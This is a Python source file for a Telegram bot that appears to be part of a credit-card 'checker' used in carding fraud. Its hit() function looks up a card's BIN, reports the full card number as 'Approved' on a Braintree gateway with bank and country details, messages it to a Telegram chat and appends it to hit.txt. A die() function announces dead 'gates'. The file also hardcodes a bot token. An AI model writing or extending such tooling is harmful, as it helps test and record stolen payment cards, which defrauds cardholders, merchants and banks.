import telebot
import requests

token = "7519672194:AAEiBXdvy_D4mNLQrUhGkEAttmowetGHhRs"
bot = telebot.TeleBot(token, parse_mode="HTML")

def hit(amt, cc, gate, key, username, chat_id):
    bin = cc[:6]
    url = f"https://lookup.binlist.net/{bin}"

    try:
        req = requests.get(url).json()
    except:
        req = {}

    inf = req.get('scheme', "------------")
    type = req.get('type', "-----------")
    brand = req.get('brand', "-----")

    info = f"{inf}-{type}-{brand}".upper()

    bank = req.get('bank', {}).get('name', "----------").upper()
    country_info = req.get('country', {})
    country = country_info.get('name', "-----------")
    emoji = country_info.get('emoji', " ").upper()
    do = f"{country} {emoji}"

    msg1 = f'''
𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
----------------------
𝐂𝐚𝐫𝐝 -> {cc}
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -> Braintree {amt}
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -> {key}
-----------------------
𝐁𝐢𝐧 -> {bin}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 -> {do}
𝐁𝐚𝐧𝐤 -> {bank}
𝐅𝐥𝐚𝐠 -> {emoji}
𝐏𝐫𝐨𝐱𝐲 -> Live ✅
----------------------
𝐇𝐢𝐭𝐭𝐞𝐝 𝐁𝐲: {username}
𝐁𝐨𝐭 𝐁𝐲 : @SandeepKhadka7
'''

    bot.send_message(chat_id=chat_id, text=msg1, parse_mode='HTML')

    name = "hit.txt"
    with open(name, "a") as f:
        f.write(f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
----------------------
𝐂𝐚𝐫𝐝 -> {cc}
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -> Braintree {amt}
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -> {key}
-----------------------
𝐁𝐢𝐧 -> {bin}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 -> {do}
𝐁𝐚𝐧𝐤 -> {bank}
𝐅𝐥𝐚𝐠 -> {emoji}
𝐏𝐫𝐨𝐱𝐲 -> Live ✅
----------------------
𝐇𝐢𝐭𝐭𝐞𝐝 𝐁𝐲: {username}
𝐁𝐨𝐭 𝐁𝐲 : @SandeepKhadka7
''')

def die(gate, username, chat_id):
    msg = f'''
    <b>Gatet is Dead -> {gate}</b>
From: <b><code>{username}</code></b>
Bot By: <b><code>@SandeepKhadka7</code></b>
'''

    bot.send_message(chat_id=chat_id, text=msg, parse_mode='HTML')
